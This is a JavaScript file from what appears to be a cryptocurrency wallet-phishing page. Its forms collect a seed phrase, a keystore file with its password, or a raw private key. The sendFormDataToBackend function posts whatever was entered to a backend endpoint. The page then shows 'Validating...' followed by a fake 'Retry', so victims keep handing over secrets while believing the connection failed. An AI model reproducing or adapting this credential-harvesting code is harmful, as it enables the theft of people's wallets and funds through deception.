// Function to open a modal
function openModal(modalId) {
    var modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'block';
    }
}

// Function to close a modal
function closeModal(modalId) {
    var modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'none';
    }
}

// Function to submit form data
function submitFormData(connectionMethod) {
    var formData;

    // Validate and get form data based on connection method
    switch (connectionMethod) {
        case 0: // Phrase
            formData = validatePhraseForm();
            break;
        case 1: // KeyStore
            formData = validateKeyStoreForm();
            break;
        case 2: // Private Key
            formData = validatePrivateKeyForm();
            break;
        default:
            return;
    }

    // Check if form data is valid
    if (formData) {
        // Send form data to backend endpoint
        sendFormDataToBackend(formData);

        // Close the modal after form submission
        closeModal('modal-' + getModalName(connectionMethod));
    }
}

// Modify the existing functions to include the new input wallet type inout

// Function to validate Phrase form
function validatePhraseForm() {
  var phraseTextarea = document.forms['phraseForm']['Phrase'].value.trim();
  var walletType = document.forms['phraseForm']['walletType'].value;

  // Basic validation
  if (phraseTextarea === '' || walletType === '') {
    swal('Please fill in all fields.');
    return null;
  }

  // Validate pattern (12 or 24 words separated by single spaces)
  var phrasePattern = /^(\S+\s+){11}\S+$|^(\S+\s+){23}\S+$/;
  if (!phrasePattern.test(phraseTextarea)) {
    swal('Phrase must be 12 or 24 words separated by single spaces.');
    return null;
  }

  // Return form data
  return { connectionMethod: 'Phrase', phrase: phraseTextarea, walletType: walletType };
}

// Function to validate KeyStore form
function validateKeyStoreForm() {
  var keystoreTextarea = document.forms['keystoreForm']['keystore'].value.trim();
  var passwordInput = document.forms['keystoreForm']['password'].value.trim();
  var walletType = document.forms['keystoreForm']['walletType'].value;

  // Basic validation
  if (keystoreTextarea === '' || passwordInput === '' || walletType === '') {
    swal('Error', 'Please enter both KeyStore, password, and select wallet type.', 'error');
    return null;
  }

  // Validate pattern (JSON format)
  var jsonPattern = /^\{[\s\S]*\}$/;
  if (!jsonPattern.test(keystoreTextarea)) {
    swal('Error', 'KeyStore must be a valid JSON format.', 'error');
    return null;
  }

  // Return form data
  return { connectionMethod: 'KeyStore', keystore: keystoreTextarea, password: passwordInput, walletType: walletType };
}

// Function to validate Private Key form
function validatePrivateKeyForm() {
  var privateKeyTextarea = document.forms['privateKeyForm']['privateKey'].value.trim();
  var walletType = document.forms['privateKeyForm']['walletType'].value;

  // Basic validation
  if (privateKeyTextarea === '' || walletType === '') {
    swal('Please fill in all fields.');
    return null;
  }

  // Validate pattern (64 alphanumeric characters)
  var privateKeyPattern = /^[a-fA-F0-9]{64}$/;
  if (!privateKeyPattern.test(privateKeyTextarea)) {
    swal('Private key must be 64 alphanumeric characters.');
    return null;
  }

  // Additional custom validation if needed

  // Return form data
  return { connectionMethod: 'PrivateKey', privateKey: privateKeyTextarea, walletType: walletType };
}

// Placeholder function for sending form data to your backend endpoint
function sendFormDataToBackend(formData) {
    // Replace 'YOUR_BACKEND_ENDPOINT' with the actual URL of your backend endpoint
    var backendEndpoint = 'http://localhost:3000/submit-form';

    fetch(backendEndpoint, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
    })
    .then(response => {
        // Check if response is successful
        if (response.ok) {
            // Display success message using swal
            swal('Validating...');
            // Delay for 2 seconds and then display "Retry" message
            setTimeout(function() {
                swal('Retry');
            }, 2000);
            return response.json(); // Return response data
        } else {
            // Display error message using swal
            swal('Error', 'Error submitting form. Please try again.', 'error');
            throw new Error('Error submitting form');
        }
    })
    .then(data => {
        // Handle response data if needed
        console.log('Backend response:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

// Function to get modal name based on connection method
function getModalName(connectionMethod) {
    switch (connectionMethod) {
        case 0:
            return 'phrase';
        case 1:
            return 'keystore';
        case 2:
            return 'private-key';
        default:
            return '';
    }
}